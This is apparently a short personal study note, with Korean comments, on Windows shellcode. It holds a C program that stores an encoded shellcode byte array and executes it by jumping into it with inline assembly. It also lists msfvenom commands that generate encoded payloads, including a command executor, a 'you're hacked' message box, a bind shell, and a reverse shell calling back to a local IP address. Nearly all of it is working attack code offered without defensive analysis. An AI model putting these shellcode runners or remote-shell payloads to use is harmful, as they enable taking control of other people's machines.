## windows shell

opcode.cpp / stdafx.cpp / stdafx.h

```c
#include "stdafx.h"
#include "windows.h"
#include "tchar.h"

char shellcode[] = "\xb8\x04\xfd\xbb\x98\xdd\xc3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x30\x31\x42\x12\x03\x42\x12\x83\xc6\xf9\x59\x6d\x3a\xe9\x1c"
"\x8e\xc2\xea\x40\x06\x27\xdb\x40\x7c\x2c\x4c\x71\xf6\x60\x61"
"\xfa\x5a\x90\xf2\x8e\x72\x97\xb3\x25\xa5\x96\x44\x15\x95\xb9"
"\xc6\x64\xca\x19\xf6\xa6\x1f\x58\x3f\xda\xd2\x08\xe8\x90\x41"
"\xbc\x9d\xed\x59\x37\xed\xe0\xd9\xa4\xa6\x03\xcb\x7b\xbc\x5d"
"\xcb\x7a\x11\xd6\x42\x64\x76\xd3\x1d\x1f\x4c\xaf\x9f\xc9\x9c"
"\x50\x33\x34\x11\xa3\x4d\x71\x96\x5c\x38\x8b\xe4\xe1\x3b\x48"
"\x96\x3d\xc9\x4a\x30\xb5\x69\xb6\xc0\x1a\xef\x3d\xce\xd7\x7b"
"\x19\xd3\xe6\xa8\x12\xef\x63\x4f\xf4\x79\x37\x74\xd0\x22\xe3"
"\x15\x41\x8f\x42\x29\x91\x70\x3a\x8f\xda\x9d\x2f\xa2\x81\xcb"
"\xae\x30\xbc\xbe\xb1\x4a\xbe\xee\xd9\x7b\x35\x61\x9d\x83\x9c"
"\xc5\x51\xce\xbc\x6c\xfa\x97\x55\x2d\x67\x28\x80\x72\x9e\xab"
"\x20\x0b\x65\xb3\x41\x0e\x21\x73\xba\x62\x3a\x16\xbc\xd1\x3b"
"\x33\xdf\xb8\xa7\xbc";


int _tmain(int argc, _TCHAR* argv[])
{
	int* shell = (int*)shellcode;
	__asm {

		jmp shell
	};
}
```



msfvenom 사용

```shell
# cmd 명령어 수행
msfvenom -p windows/exec cmd=cmd -e x86/shikata_ga_nai -b '\x0a\x00' -f c
# 메시지 박스 활용
msfvenom -p windows/messagebox title="hi" text="you're hacked" -e x86/shikata_ga_nai -b '\x0a\x00' -f c
# 00없애기?
msfvenom -p windows/shell_bind_tcp lport=7777 -e x86/shikata_ga_nai -b '\x0a\x00' -f c
# 특정 주소 포트 열기
msfvenom -p windows/shell_reverse_tcp lhost=192.168.247.164 lport=7777 -e x86/shikata_ga_nai -b '\x0a\x00' -f c
```

